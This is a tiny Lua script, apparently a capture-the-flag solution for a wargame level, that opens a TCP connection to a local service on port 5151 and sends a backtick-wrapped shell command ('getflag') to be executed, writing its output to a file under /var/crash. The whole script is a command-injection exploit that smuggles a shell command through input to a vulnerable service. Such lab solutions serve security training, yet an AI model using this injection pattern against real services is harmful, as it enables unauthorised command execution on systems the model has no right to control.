#!/usr/bin/env lua
local host, port = "127.0.0.1", 5151
local socket = require("socket")
local tcp = assert(socket.tcp())

tcp:connect(host, port)

tcp:send("`getflag > /var/crash/level11_output.txt`\n")

tcp:close()